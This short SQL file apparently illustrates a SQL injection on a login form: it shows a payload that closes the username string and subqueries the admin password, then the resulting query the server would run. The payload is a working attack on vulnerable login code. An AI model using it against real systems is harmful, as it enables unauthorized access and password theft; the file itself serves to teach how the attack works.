USING some_db;

--This payload:

/*
                                        ' or 1 in (select password from users where username = 'admin') -- //
*/

--Which results in the server running this SQL code:
;

    SELECT * FROM users WHERE username='' or 1 in (select password from users where username = 'admin') -- //' AND password = '0cc175b9c0f1b6a831c399e269772661'
